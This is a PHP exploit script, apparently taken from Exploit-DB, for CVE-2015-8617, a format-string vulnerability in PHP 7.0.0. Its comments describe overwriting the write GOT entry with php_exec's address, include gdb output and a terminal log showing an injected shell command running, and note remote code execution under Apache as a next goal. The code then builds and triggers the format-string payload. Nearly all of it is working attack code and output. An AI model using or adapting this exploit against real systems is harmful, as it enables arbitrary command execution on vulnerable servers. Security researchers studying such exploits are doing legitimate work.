<?php
/*
https://www.exploit-db.com/exploits/39082/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8617

Overwrite write@GOT to php_exec@text and when PHP writes the error message our command gets executed!

   0x775803 <sapi_cli_single_write+51>:	mov    rdx,rbp
   0x775806 <sapi_cli_single_write+54>:	mov    rsi,rbx
   0x775809 <sapi_cli_single_write+57>:	mov    edi,0x1
=> 0x77580e <sapi_cli_single_write+62>:	call   0x421360 <write@plt>
   0x775813 <sapi_cli_single_write+67>:	test   rax,rax
   0x775816 <sapi_cli_single_write+70>:	jle    0x7757f0 <sapi_cli_single_write+32>
   0x775818 <sapi_cli_single_write+72>:	add    rsp,0x8
   0x77581c <sapi_cli_single_write+76>:	pop    rbx
Guessed arguments:
arg[0]: 0x1 
arg[1]: 0x7ffff466b000 ("\nFatal error: Uncaught Error: Class ''$(echo pwned > ./pwned.txt)", ' ' <repeats 137 times>...)
arg[2]: 0x442 

PHPAPI int php_exec(int type, char *cmd, zval *array, zval *return_value)

Perfect match for the cmd parameter in php_exec()! :)

Output:
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ ./php a.php
sh: 2: Fatal: not found
Segmentation fault (core dumped)
d@ubuntupwn:~/php/php-7.0.0/sapi/cli$ cat pwned.txt
pwned

TODO:
	RCE when running under apache or similar
*/	

$cmd = "'$(echo pwned > ./pwned.txt)";

//00000000620920 T php_exec
$php_exec = 0x00000000620920 - (15+strlen($cmd));

//000000ea2298  038e00000007 R_X86_64_JUMP_SLO 0000000000421360 write + 0
$write_got = 0x000000ea2298 - (22+strlen($cmd));

$name = $cmd . "%" . $php_exec . "c" . "%p%p" . "%n" . str_repeat("A",$write_got);

$name::ch00ch00();

?>

